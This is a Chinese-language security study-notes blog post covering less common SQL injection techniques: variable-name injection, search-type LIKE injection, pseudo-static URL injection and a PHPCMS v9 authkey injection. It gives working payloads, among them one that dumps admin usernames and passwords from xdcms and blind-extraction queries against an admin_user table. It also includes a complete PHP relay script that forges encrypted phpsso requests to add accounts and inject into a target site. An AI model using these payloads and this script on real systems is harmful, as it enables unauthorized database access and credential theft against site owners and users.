---
layout:     post
title:      Web笔记（六）SQL注入之其他注入
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是补充常见数据库本身的注入以外的SQL注入。
date:       2020-11-29
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
---



## 0x01 变量名注入

有时候可能会在奇奇怪怪的地方可以注入，如post变量名可能出现如下，有点像字典一样的变量：

```
POST / HTTP 1.0
...
...

fields[truename]=Bob
```

或者

```
POST / HTTP 1.0
...
...

fields%5Btruename%5D=Bob
```

例如：xdcms某版本的修改会员资料处的姓名，就是这种注入漏洞，exp：

```
%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23

（url解码为：`=(select group_concat(username,0x3a,password) from c_admin where id=1)#）
```

把上面这一段放在fields%5Btruename%5D的%5D前面，也就是如下

```
POST / HTTP 1.0
...
...

fields%5Btruename%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23%5D
```
自行解一下码方便看，如下：
```
POST / HTTP 1.0
...
...

fields[truename`=(select group_concat(username,0x3a,password) from c_admin where id=1)#]
```
即可形成攻击。



## 0x02 搜索型注入 

- like
- 通配符 \*
- sql通配符 %%
- select * from news where id='%like $id %'

```
# 判断是否存在搜索型输入
id=2%' and 1=1 and '%'='     返回和单独输入2是一样的页面
id=2%' and 1=2 and '%'='     返回不同

# 判断是数据库类型
id=2%' and(select count(\*) from mssysaccessobjects)>0 and '%'='  //返回正常，access数据库

# 判断表名是否存在
id=2%' and(select count(\*) from admin_user)>0 and '%'='       //返回正常，存在admin_user表

# 判断字段名是否存在
id=2%' and(select count(username) from admin_user)>0 and '%'='   //返回正常，存在username字段
id=2%' and(select count(passeword) from admin_user)>0 and '%'='  //返回正常，存在password字段

# 判断字段长度
id=2%' and(select top 1 len(username) from admin_user)>4 and '%'='   //返回正常，username长度大于4
id=2%' and(select top 1 len(username) from admin_user)=5 and '%'='  //返回正常，username长度等于5

# 判断具体数据的单个字符
id=2%' and(select top 1 asc(mid(password,1,1))from admin_user)=55 and '%'='  //返回正常，则对应位置的ascii编码是对的，否则错误
```



## 0x03 伪静态注入

```
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131.html
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131
```

注入点在上面1131后面，也就是html文件名，如下：

```
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131' and 1=1.html
```

常出现此注入的框架：

- aspcms
- phpweb
- thinkphp

还有其他类型的伪静态如：

```
http://xxx.com/x_detail_id_1234.html
```

在网站后台可能相当于

```
http://xxx/com/x/detail.php?id=1234
```



## 0x04 phpv9 authkey注入

#### 1. 用exp爆出注入点

```
api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin
```

或者以下

```
/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V
```

#### 2. 本地搭建php网站作为中间人

新建一个php文件并写入内容，然后将文件放到本地搭建的php网站目录下，将上面代码执行爆出的auth_key和url写到下面攻击代码中：

php?url=[原始网站的url]&key=[上面爆到的auth_key]&id=userid=1

如：http://127.0.0.1/xxx.php?url=www.xxx.com&key=xxxxxxxxxxxxxxxxxxxxxx&id=userid=1 and 1=1

然后访问本地该文件，对本地该文件访问进行注入即可，本地该文件相当于中间人，负责转发注入请求。

#### 3. php文件

php文件写入的内容如下：

```php
<?php
#error_reporting(0);
$url = $_GET['url'];
$key = $_GET['key'];
//$host = 'http://网站/';
//$auth_key = '爆的key';
//$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
$host = "http://$url/";
$auth_key = "$key";
$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
$strings = "action=member_add&uid=88888&random=333333&username=test123456&password=e445061346e44cc38d9f985836b9eac6&email=ffff@qq.com®ip=8.8.8.8";
$ecode = sys_auth($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
#echo $url;
$resp = file_get_contents($url);
echo $resp;
$ecode = sys_auth2($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth2($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
$ecode = sys_auth3($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth3($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
        $key_length = 4;
        $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
        $fixedkey = md5($key);
        $egiskeys = md5(substr($fixedkey, 16, 16));
        $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
        $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
        $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string :
base64_decode(strtr(substr($string, $key_length), '-_', '+/'));
        if($operation=='ENCODE'){
                $string .= substr(md5(microtime(true)), -4);
        }
        if(function_exists('mcrypt_encrypt')==true){
                $result=sys_auth_ex($string, $operation, $fixedkey);
        }else{
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
        }
        if($operation=='DECODE'){
                $result = substr($result, 0,-4);
        }
         
        if($operation == 'ENCODE') {
                return $runtokey . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        } else {
                if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result,
26).$egiskeys), 0, 16)) {
                        return substr($result, 26);
                } else {
                        return '';
                }
        }
}
function sys_auth_ex($string,$operation = 'ENCODE',$key)
{
    $encrypted_data="";
    $td = mcrypt_module_open('rijndael-256', '', 'ecb', '');
    $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
    $key = substr($key, 0, mcrypt_enc_get_key_size($td));
    mcrypt_generic_init($td, $key, $iv);
    if($operation=='ENCODE'){
        $encrypted_data = mcrypt_generic($td, $string);
    }else{
        $encrypted_data = rtrim(mdecrypt_generic($td, $string));
    }
    mcrypt_generic_deinit($td);
    mcrypt_module_close($td);
    return $encrypted_data;
}
function  sys_auth2($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $ckey_length = 4;
                $key = md5($key != '' ? $key : $this->ps_auth_key);
                $keya = md5(substr($key, 0, 16));
                $keyb = md5(substr($key, 16, 16));
                $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
                $cryptkey = $keya.md5($keya.$keyc);
                $key_length = strlen($cryptkey);
                $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry +
time() : 0).substr(md5($string.$keyb), 0, 16).$string;
                $string_length = strlen($string);
                $result = '';
                $box = range(0, 255);
                $rndkey = array();
                for($i = 0; $i <= 255; $i++) {
                        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
                }
                for($j = $i = 0; $i < 256; $i++) {
                        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
                        $tmp = $box[$i];
                        $box[$i] = $box[$j];
                        $box[$j] = $tmp;
                }
                for($a = $j = $i = 0; $i < $string_length; $i++) {
                        $a = ($a + 1) % 256;
                        $j = ($j + $box[$a]) % 256;
                        $tmp = $box[$a];
                        $box[$a] = $box[$j];
                        $box[$j] = $tmp;
                        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
                }
                if($operation == 'DECODE') {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result,
26).$keyb), 0, 16)) {
                                return substr($result, 26);
                        } else {
                                return '';
                        }
                } else {
                        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
                }
        }
function sys_auth3($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $key_length = 4;
                $key = md5($key);
                $fixedkey = md5($key);
                $egiskeys = md5(substr($fixedkey, 16, 16));
                $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
                $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
                  
                $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string :
base64_decode(substr($string, $key_length));
                //10位密文过期信息+16位明文和密钥生成的密文验证信息+明文
                  
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                  $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
                  
                if($operation == 'ENCODE') {
                    return $runtokey . str_replace('=', '', base64_encode($result));
                } else {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result,
26).$egiskeys), 0, 16)) {
                          return substr($result, 26);
                        } else {
                          return '';
                        }
                }
    }
?>
```



## 0x05 参考

[https://bbs.ichunqiu.com/thread-19033-1-1.html](https://bbs.ichunqiu.com/thread-19033-1-1.html)